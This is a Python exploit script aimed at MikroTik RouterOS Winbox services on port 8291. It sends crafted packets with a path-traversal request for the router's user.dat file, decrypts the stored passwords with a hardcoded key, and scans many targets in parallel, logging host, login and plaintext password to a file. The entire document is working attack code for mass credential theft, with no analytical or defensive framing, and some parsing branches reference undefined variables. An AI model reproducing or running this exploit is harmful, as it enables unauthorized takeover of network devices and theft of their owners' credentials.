#!/usr/bin/env python3

import argparse, binascii, struct, hashlib, time
from multiprocessing import Pool
from io import BytesIO
from socket import *
results_filename = 'winbox-extract-passwords.log'

TIMEOUT = 5
SLEEP_TIME = 0.5

# Packet headers
M2_HEADER = b'\x4d\x32'
M2_EXTRA  = b'\x01\x00'

# Winbox protocol types
MT_BOOL       = 0x00
MT_BOOL_CODE  = {False: 0x00, True: 0x01}
MT_BOOL_VALUE = {0x00: False, 0x01: True}
MT_DWORD      = 0x08
MT_BYTE       = 0x09
MT_STRING     = 0x21
MT_HASH       = 0x31
MT_ARRAY      = 0x88

DEBUG = False

# Global variables
targets = []
number_of_threads = 50
log = False

# mtPacket
class mtPacket(object):
	def __init__(self):
		self.contents = []
		self.raw = None
		self.ready = False
		self.parsed = False

	def add(self, id, type, value):
		self.contents.append((id, type, value))

	def build(self):
		buf = BytesIO()
		for k in self.contents:
			id, type, value = k
			if type == MT_BOOL:
				type = MT_BOOL_CODE[value]
				size_bytes = b''
				value_bytes = b''
			elif type == MT_DWORD:
				size_bytes = b''
				value_bytes = struct.pack('<I', value)
			elif type == MT_BYTE:
				size_bytes = b''
				value_bytes = struct.pack('B', value)
			elif type == MT_STRING:
				size_bytes = struct.pack('B', len(value))
				value_bytes = value.encode('UTF-8')
			elif type == MT_HASH:
				size_bytes = struct.pack('B', len(value))
				value_bytes = value
			elif type == MT_ARRAY:
				size_bytes = struct.pack('<H', len(value))
				value_bytes = b''
				for element in value:
					value_bytes += struct.pack('<I', element)
			id_bytes = struct.pack('<I', id)[0:3]
			type_bytes = struct.pack('B', type)
			buf.write(id_bytes + type_bytes + size_bytes + value_bytes)

		buf_data = buf.getvalue()
		buf_size = len(buf_data)
		self.raw = struct.pack('B', buf_size + 4) + M2_EXTRA + struct.pack('B', buf_size + 2) + M2_HEADER + buf_data
		self.ready = True
		return self.raw

	def debug(self):
		for i in self.contents:
			print(i)

	def parse(self):
		packet_size = len(self.raw)
		if self.raw[4:6] != M2_HEADER:
			raise Exception('Not a M2 block!')
		data_size, = struct.unpack('>H', self.raw[2:4])
		if data_size + 4 != packet_size:
			raise Exception('Packet header size is incorrect!')
		block = self.raw[6:]
		pointer = 0
		block_size = len(block)
		while pointer + 4 < block_size:
			id, = struct.unpack('<I', block[pointer:pointer+3] + b'\x00')
			pointer += 3
			type = ord(block[pointer:pointer+1])
			pointer += 1
			if type in MT_BOOL_CODE:
				value = MT_BOOL_VALUE[keyword_type]
			elif type == MT_DWORD:
				value, = struct.unpack('<I', block[pointer:pointer+4])
				pointer += 4
			elif type == MT_BYTE:
				value, = struct.unpack('B', block[pointer:pointer+1])
				pointer += 1
			elif type == MT_STRING:
				length = ord(block[pointer:pointer+1])
				pointer += 1
				value = block[pointer:pointer+length]
				pointer += length
			elif type == MT_HASH:
				length = ord(stream[pointer:pointer+1])
				pointer += 1
				value = block[pointer:pointer+length]
				pointer += length
			elif type == MT_ARRAY:
				array_size, = struct.unpack('<H', block[pointer:pointer+2])
				pointer += 2
				i = 0
				value = []
				while i < array_size:
					element, = struct.unpack('<I', block[pointer:pointer+4])
					i += 1
					pointer += 4
					value.append(element)
			else:
				print('%x' % keyword_code)
				raise Exception('Unknown or unhandled keyword/code!')
			self.contents.append((id, type, value))
		self.parsed = True

class mtTCPSession(object):
	def __init__(self, host, port = None, timeout = None):
		self.host = host
		if port:
			self.port = port
		else:
			self.port = 8291
		if timeout:
			self.timeout = timeout
		self.ready = False

	def connect(self):
		try:
			self.socket = socket(AF_INET, SOCK_STREAM)
		except:
			raise Exception('Socket creation error!')
		if timeout:
			self.socket.settimeout(self.timeout)
		try:
			self.socket.connect((self.host, self.port))
		except:
			self.ready = False
			raise Exception('Connection error to %s:%s' % (self.host, self.port))
		self.ready = True

	def send_bytes(self, bytes):
		if not self.ready:
			raise Exception('Not connected to %s:%s' % (self.host, self.port))
		try:
			self.socket.send(bytes)
		except:
			return False
		return True

	def recv_bytes(self, size):
		if not self.ready:
			raise Exception('Not connected to %s:%s' % (self.host, self.port))
		try:
			result = self.socket.recv(size)
		except:
			result = None
		return result

	def close(self):
		self.socket.close()
		self.ready = False

	def send_packet(self, packet):
		if not packet.ready:
			packet.build()
		self.send_bytes(packet.raw)

	def recv_packet(self, size):
		received_bytes = self.recv_bytes(size)
		if received_bytes is not None:
			result = mtPacket()
			result.raw = received_bytes
			result.parse()
		else:
			result = None
		return result

def h(msg, data):
	print(msg, binascii.hexlify(data).decode('UTF-8'))

def mt_freq_01(filename):
	m2 = mtPacket()
	m2.add(0xff0005, MT_BOOL, True)
	m2.add(0xff0006, MT_BYTE, 7)
	m2.add(0xff0007, MT_BYTE, 7)
	m2.add(0x000001, MT_STRING, filename)
	m2.add(0xff0002, MT_ARRAY, [0, 8])
	m2.add(0xff0001, MT_ARRAY, [2, 2])
	m2.build()
	return m2

def mt_freq_02(sid):
	id, type, value = sid
	m2 = mtPacket()
	m2.add(0xff0005, MT_BOOL, True)
	m2.add(0xff0006, MT_BYTE, 0)
	m2.add(id, type, value)
	m2.add(0x000002, MT_DWORD, 0x8000)
	m2.add(0xff0007, MT_BYTE, 4)
	m2.add(0xff0002, MT_ARRAY, [0, 8])
	m2.add(0xff0001, MT_ARRAY, [2, 2])
	m2.build()
	return m2

def mt_get_sid(packet):
	if packet is not None and packet.parsed:
		for id, type, value in packet.contents:
			if id == 0xfe0001:
				return (id, type, value)
	return None

def mt_get_fsize(packet):
	if packet is not None and packet.parsed:
		for id, type, value in packet.contents:
			if id == 0x000002 and (type == MT_DWORD or type == MT_BYTE):
				return value
	return None

def m2_split(stream):
	result = []
	stream_size = len(stream)
	pointer = 0
	header_found = False
	while pointer + 4 < stream_size and not header_found:
		if stream[pointer+2:pointer+4] != M2_HEADER:
			pointer += 1
		else:
			header_found = True
	if not header_found:
		return None
	while pointer + 4 < stream_size:
		block_size, = struct.unpack('<H', stream[pointer:pointer+2])
		start = pointer + 4
		pointer = pointer + block_size
		next_header_found = False
		while pointer + 4 < stream_size and not next_header_found:
			if stream[pointer+2:pointer+4] != M2_HEADER:
				pointer += 1
			else:
				next_header_found = True
		if not next_header_found:
			pointer = stream_size
		block_data = stream[start:pointer]
		result.append(block_data)
	return result

def decrypt_password(user, pass_enc):
	key = hashlib.md5(user + b"283i4jfkai3389").digest()
	passw = ''
	for i in range(0, len(pass_enc)):
		passw += chr(pass_enc[i] ^ key[i % len(key)])
	return passw.split("\x00")[0]

def extract_user_pass_from_entry(entry):
	user_data = entry.split(b"\x01\x00\x00\x21")[1]
	pass_data = entry.split(b"\x11\x00\x00\x21")[1]
	user_len = user_data[0]
	pass_len = pass_data[0]
	username = user_data[1:1 + user_len]
	password = pass_data[1:1 + pass_len]
	return username, password

def good_str(str):
	for c in str:
		if ord(c) not in range(32, 128):
			return False
	return True

# Return an array of (user, plaintext password) tuples
def get_pair(data):
	user_list = []
	entries = m2_split(data)
	if entries is None:
		return None
	for entry in entries:
		try:
			user, pass_encrypted = extract_user_pass_from_entry(entry)
		except:
			continue

		pass_plain = decrypt_password(user, pass_encrypted)
		try:
			user = user.decode('ascii')
		except:
			continue

		if good_str(user) and good_str(pass_plain):
			user_list.append((user, pass_plain))
		else:
			if DEBUG:
				print('Bad user/password')
	return user_list

# Request user.dat from a remote winbox service
def get_userdat(target):
	result = []

	try:
		print('[*] Connecting to %s...' % target)
		s = mtTCPSession(target, 8291, TIMEOUT)
		s.connect()
		if not s.ready:
			print('[-] ERROR connecting to %s' % target)
			return None
	except:
		print('[-] ERROR connecting to %s' % target)
		s.close()
		return None
	p1 = mt_freq_01('./.././.././.././.././../rw/store/user.dat')
	try:
		if DEBUG:
			print('[*] Sending the 1st packet to %s...' % target)
		s.send_packet(p1)
	except:
		if DEBUG:
			print('[-] ERROR sending the 1st packet to %s' % target)
		s.close()
		return None
	try:
		if DEBUG:
			print('[*] Reading the response to the 1st packet from %s...' % target)
		r1 = s.recv_packet(1024)
	except:
		if DEBUG:
			print('[-] ERROR reading response to the 1st packet from %s' % target)
		s.close()
		return None
	if DEBUG and r1 is not None:
		h('r1', r1.raw)
	fsize = mt_get_fsize(r1)
	if fsize is None:
		print('[-] ERROR reading user database file size from %s' % target)
		s.close()
		return None
	if DEBUG:
		print(fsize)
	sid = mt_get_sid(r1)
	if sid is None:
		if DEBUG:
			print('[-] ERROR reading session id from %s' % target)
		s.close()
		return None
	p2 = mt_freq_02(sid)
	try:
		if DEBUG:
			print('[*] Sending the 2nd packet to %s...' % target)
		s.send_packet(p2)
	except:
		if DEBUG:
			print('[-] ERROR sending the 2nd packet to %s' % target)
		s.close()
		return None
	try:
		if DEBUG:
			print('[*] Reading the response to the 2nd packet from %s...' % target)
		time.sleep(0.1)
		r2 = s.recv_bytes(fsize + 128)
	except:
		if DEBUG:
			print('[-] ERROR reading response to the 2nd packet from %s' % target)
		s.close()
		return None
	if r2 is not None:
		if DEBUG:
			h('r2', r2)
		skip = len(r2) - fsize - 4

		user_dat = r2[skip:]
		user_pass = get_pair(user_dat)

		if user_pass is None:
			if DEBUG:
				print('[-] ERROR no user/password pairs has been parsed from %s' % target)
			s.close()
			return None

		for l, p in user_pass:
			print('%s\t%s\t%s' % (target, l, p))
			result.append((target, l, p))
	s.close()
	return result

def read_targets(filename):
	try:
		with open(filename) as f:
			targets = [t.strip() for t in f.readlines()]
		f.close()
		return targets
	except:
		return None

if __name__ == '__main__':
	results_file_opened = False

	parser = argparse.ArgumentParser(description='description')
	parser.add_argument('-t', '--target', help = 'Single target', required = False)
	parser.add_argument('-T', '--targets', help = 'Targets list filename', required = False)
	parser.add_argument('-n', '--threads', type = int, help = 'Number of threads for parallel processing', required = False)
	parser.add_argument('--log', help = 'Write log file', required = False)
	parser.add_argument('--debug', action = 'store_true', help = 'Debug mode', required = False)
	args = vars(parser.parse_args())

	if not (args['target'] or args['targets']):
		print('Please specify --target/-t <host> or --targets/-T <filename>')
		exit(1)
	elif args['target'] and args['targets']:
		print('Please specify either --target/-t <host> option, or --targets/-T <filename>, but not both')
		exit(1)
	elif args['target']:
		targets.append(args['target'])
		number_of_threads = 1
	else:
		targetsfile = args['targets']
		targets = read_targets(targetsfile)
		if targets is None:
			print('Error reading the targets file: %s' % targetsfile)
			exit(1)
		targets_count = len(targets)
		if targets_count < number_of_threads:
			number_of_threads = targets_count

	if args['debug']:
		DEBUG = True

	if args['threads']:
		number_of_threads = args['threads']

	if args['log']:
		log = True
		log_filename = args['log']
		log_file = open(log_filename, 'a')

	print('[*] Starting with %s threads' % number_of_threads)
	pool = Pool(processes = number_of_threads)
	results = pool.map(get_userdat, targets)
	pool.close()
	pool.join()
	print('[!] Finishing...')

	for r in results:
		if r is not None:
			for t in r:
				host, login, password = t
				out = host + ' ' + login + ' ' + password
				if not results_file_opened:
					results_file = open(results_filename, 'a')
					results_file_opened = True
				results_file.write(out + '\n')
				if log:
					log_file.write(host + '\t' + login + '\t' + password + '\n')

	if results_file_opened:
		results_file.close()
	if log:
		log_file.close()

